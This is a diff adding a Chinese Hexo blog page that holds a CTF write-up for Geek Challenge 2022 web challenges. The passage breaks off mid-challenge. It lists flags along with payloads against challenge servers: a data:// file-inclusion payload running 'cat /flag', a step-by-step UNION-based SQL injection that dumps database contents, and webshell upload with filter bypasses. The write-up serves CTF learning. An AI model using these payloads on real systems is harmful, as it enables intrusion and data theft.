@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hudielan.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fhudielan.png">
+  <link rel="mask-icon" href="/images/hudielan.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <meta name="description" content="Geek Challenge 2022  wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Geek Challenge 2022题目复现">
+<meta property="og:url" content="http://example.com/2022/12/01/Geek%20Challenge%202022/index.html">
+<meta property="og:site_name" content="影影之家">
+<meta property="og:description" content="Geek Challenge 2022  wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211161957154.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211161958363.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211162124786.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172000151.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172001685.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172005912.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172006373.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171944663.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171947238.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172039301.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172040497.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172040335.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172101874.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172103275.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172105309.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181653618.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181653558.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181705883.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181709823.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181715288.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181716026.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181718510.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181729463.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172022817.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172023247.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172133495.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172136289.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172138103.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172144420.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172146078.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172148465.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191407634.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191411322.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191413603.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191414146.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191421277.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191421045.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191426085.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191433502.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191443448.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211212136422.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211212138662.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171928636.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171930060.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171930253.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181840827.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211190941458.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181911797.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181910084.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211190942289.png?x-oss-process=wsy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211190942973.png?x-oss-process=wsy">
+<meta property="article:published_time" content="2022-12-01T13:51:36.000Z">
+<meta property="article:modified_time" content="2023-01-18T06:47:39.161Z">
+<meta property="article:author" content="余归">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211161957154.png?x-oss-process=wsy">
+
+<link rel="canonical" href="http://example.com/2022/12/01/Geek%20Challenge%202022/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Geek Challenge 2022题目复现 | 影影之家</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">影影之家</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/Geek%20Challenge%202022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="余归">
+      <meta itemprop="description" content="Believe not all that you see nor half what you hear.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="影影之家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Geek Challenge 2022题目复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-01 21:51:36" itemprop="dateCreated datePublished" datetime="2022-12-01T21:51:36+08:00">2022-12-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-18 14:47:39" itemprop="dateModified" datetime="2023-01-18T14:47:39+08:00">2023-01-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/12/01/Geek%20Challenge%202022/" class="post-meta-item leancloud_visitors" data-flag-title="Geek Challenge 2022题目复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/12/01/Geek%20Challenge%202022/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/12/01/Geek%20Challenge%202022/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Geek Challenge 2022  wp</p>
+<span id="more"></span>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="L0veSyc"><a href="#L0veSyc" class="headerlink" title="L0veSyc"></a>L0veSyc</h2><p>直接查看源码</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211161957154.png?x-oss-process=wsy" alt="image-20221116195705960"></p>
+<p>得到flag    SYC{We1c0me_t0_Geek_2022!}</p>
+<h2 id="Can-Can-Need"><a href="#Can-Can-Need" class="headerlink" title="Can Can Need"></a>Can Can Need</h2><p>根据题目要求一步步的来</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211161958363.png?x-oss-process=wsy" alt="image-20221116195842244"></p>
+<p>然后得到flag     SYC{E3sy_Http_hhXD2333}</p>
+<h2 id="登陆试试"><a href="#登陆试试" class="headerlink" title="登陆试试"></a>登陆试试</h2><p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211162124786.png?x-oss-process=wsy" alt="image-20221116212425702"></p>
+<p>自己做一个字典直接爆破一下得到flag    </p>
+<h2 id="你能发包吗"><a href="#你能发包吗" class="headerlink" title="你能发包吗"></a>你能发包吗</h2><p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172000151.png?x-oss-process=wsy" alt="image-20221117200046115"></p>
+<p>首先抓包看一下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172001685.png?x-oss-process=wsy" alt="image-20221117200111646"></p>
+<p>得到源码，发现是想让我们自己构造一个请求，意思就是通过xhr对象发出post请求   ifffflag=flag.php  并且还需要get一下ifffflag的值</p>
+<p>所以简单的构造</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172005912.png?x-oss-process=wsy" alt="image-20221117200539867"></p>
+<p>最后传一下 ifffflag=flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172006373.png?x-oss-process=wsy" alt="image-20221117200602327"></p>
+<p>最终得到flag   SYC{:D_y0u_has_known_how_to_construct_a_requests_by_yourself}</p>
+<h2 id="justphp"><a href="#justphp" class="headerlink" title="justphp"></a>justphp</h2><p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171944663.png?x-oss-process=wsy" alt="image-20221117194404588"></p>
+<p>先简单的审计一下这个源码，意思就是我们需要get传参SleepTime，但是这个参数需要是一个int并且需要大于86400 * 30  小于86400 * 60，但是仅仅满足这些是不行的，因为我传参进去的数很大，而sleep函数是需要满足上面你传参的那些时间才能进行下一步echo  flag</p>
+<p>因此，我们可以使用科学计数法来绕过，若果我们输入3e6的话，就是3000000，刚好在两个数之间，而且int之后就是3，所以只需要等3秒就会出现flag</p>
+<p>sleep函数</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211171947238.png?x-oss-process=wsy" alt="image-20221117194707201"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;C@nzik#lik3s_to#sleeP_in_class?*#&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="justfind"><a href="#justfind" class="headerlink" title="justfind"></a>justfind</h2><p>首先查看一下源码，但是禁用了右键以及F12，所以直接在url前面加一下view-source:</p>
+<p>得到源码<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172039301.png?x-oss-process=wsy" alt="image-20221117203928259"></p>
+<p>最后在js/load.js里面找到<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172040497.png?x-oss-process=wsy" alt="image-20221117204010450"></p>
+<p>最后找到flag的编码</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172040335.png?x-oss-process=wsy" alt="image-20221117204037285"></p>
+<p>base64+JJEncode得到最终的flag</p>
+<p>SYC{D@y0u_LiKKe_D3code_EnCodE}</p>
+<h2 id="ezR-F-I"><a href="#ezR-F-I" class="headerlink" title="ezR_F_I"></a>ezR_F_I</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: 想要得到flag就快来包含一下叭 可能你需要一台具有公网ip的服务器</span><br></pre></td></tr></table></figure>
+
+<p>所以本题目是远程文件包含，简单的测试一下会发现不论输入什么，后面都会出来一个.html</p>
+<p>简单的上网搜索一下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172101874.png?x-oss-process=wsy" alt="image-20221117210117752"></p>
+<p>试了一下这位博主的payload，发现可以执行phpinfo</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172103275.png?x-oss-process=wsy" alt="image-20221117210344229"></p>
+<p>然后直接执行一下cat /flag的命令  </p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.62.30:7005/include.php?file=data:text/plain,&lt;?php system(&#x27;cat /flag&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172105309.png?x-oss-process=wsy" alt="image-20221117210544264"></p>
+<p>最终找到flag       SYC{Th1s_is_RFI_hahaha!}</p>
+<h2 id="WelcomeSQL"><a href="#WelcomeSQL" class="headerlink" title="WelcomeSQL"></a>WelcomeSQL</h2><p><strong>1.判断注入点</strong></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181653618.png?x-oss-process=wsy" alt="image-20221118165334294"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181653558.png?x-oss-process=wsy" alt="image-20221118165351251"></p>
+<p>经过判断，本题存在注入点，且是整型参数，字段是4</p>
+<p><strong>2.order by判断表中列的数量</strong></p>
+<p>order by原本的用途是排序，order by x(x为一个数字)，就会按照表中第x个字段进行重新排序。如果一个表的字段数只有4，但是我们用order by 5也就是，把第5个字段去排序，而数据库中并不存在第5字段，所以会报错。<br>而我们可以利用这个特点去猜字段数（一般使用二分的思路来判断）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=1 order by 2  //页面正常</span><br><span class="line">http://120.77.11.65:8100/?id=1 order by 3  //页面返回错误</span><br></pre></td></tr></table></figure>
+
+<p>所以由此判断，表中一共2个字段</p>
+<p><strong>3.使用union，确认显示位</strong></p>
+<p>payload  ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=-1 union select 1,2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181705883.png?x-oss-process=wsy" alt="image-20221118170521723"></p>
+<p>可以看到1，2是回显位</p>
+<p><strong>4.获取数据库信息</strong></p>
+<p>0x01获取数据库名：</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=-1 union select 1,database()</span><br></pre></td></tr></table></figure>
+
+<p>database()函数作用是：返回默认或当前数据库的名称</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181709823.png?x-oss-process=wsy" alt="image-20221118170955692"></p>
+<p>数据库名为：welcomesql</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=-1 union select 1,group_concat(schema_name)from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181715288.png?x-oss-process=wsy" alt="image-20221118171521045"></p>
+<p>获取所有数据库名,但是information_schema,mysql,performance_schema都是常见的数据库的名称，所以直接查看WelcomeSQL里面的表名</p>
+<p>0x02获取数据库表名：</p>
+<p>paylaod:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;WelcomeSQL&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181716026.png?x-oss-process=wsy" alt="image-20221118171630750"></p>
+<p>只有一个user_info表名</p>
+<p>但是正常的都是users（用户）通常用户的账号和密码会存放在这个表当中；</p>
+<p>0x03获取数据库表中所有字段:</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=-1 union select 1,group_concat(column_name)from information_schema.columns where table_schema=&#x27;WelcomeSQL&#x27; and table_name=&#x27;user_info&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181718510.png?x-oss-process=wsy" alt="image-20221118171827318"></p>
+<p>发现有一个secret字段</p>
+<p>0x04获取字段中的数据:</p>
+<p>查询secret的值</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.77.11.65:8100/?id=-1 union select 1,group_concat(secret)from WelcomeSQL.user_info</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211181729463.png?x-oss-process=wsy" alt="image-20221118172910199"></p>
+<p>最终得到flag   SYC{VV31c0me_T0_5QL1_vv01rd_!}</p>
+<p>相关连接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41936015/article/details/126236200">https://blog.csdn.net/qq_41936015/article/details/126236200</a></p>
+<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>直接上传一句话木马</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172022817.png?x-oss-process=wsy" alt="image-20221117202254761"></p>
+<p>然后蚁剑连接一下找到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172023247.png?x-oss-process=wsy" alt="image-20221117202358192"></p>
+<p>flag为   SYC{welc0me_t0_up10ad_wor1d!}</p>
+<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:我都懂，我都明白，我是没有策略的防火墙，是被无限绕过的WAF，是扫不出马的EDR，是丢流量的探针，是没升级的态势感知，我守不住内网，也守不住你。#flag或许会在当前目录#</span><br></pre></td></tr></table></figure>
+
+<p>首先看一下源码</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172133495.png?x-oss-process=wsy" alt="image-20221117213311333"></p>
+<p>发现过滤了好多东西，但是没有过滤tac，所以浅浅的试一下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172136289.png?x-oss-process=wsy" alt="image-20221117213655139"></p>
+<p>但是没发现任何东西，把flag改为*之后查看源码，找到了flag.php</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172138103.png?x-oss-process=wsy" alt="image-20221117213809941"></p>
+<p>没有头绪，但是想到hint，我们可以尝试列一下目录</p>
+<p>（方法一）</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172144420.png?x-oss-process=wsy" alt="image-20221117214400353"></p>
+<p>（方法二）</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172146078.png?x-oss-process=wsy" alt="image-20221117214600025"></p>
+<p>所以直接tac may_b3_y0u_can_pr0t3ct.php，但是php被过滤了，直接m*</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211172148465.png?x-oss-process=wsy" alt="image-20221117214850401"></p>
+<p>最终得到flag    SYC{y0u_n33d_a_g1rfr1nd}</p>
+<h2 id="uploadrce"><a href="#uploadrce" class="headerlink" title="uploadrce"></a>uploadrce</h2><p>首先先扫一下备份文件</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/wsy/202211191407634.png?x-oss-process=wsy" alt="image-20221119140758516"></p>
+<p>首先看一下.config.php.swp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$option=&#x27;chinfo&#x27;; &lt;?php </span><br></pre></td></tr></table></figure>
+
+<p>再看一下index.php</p>
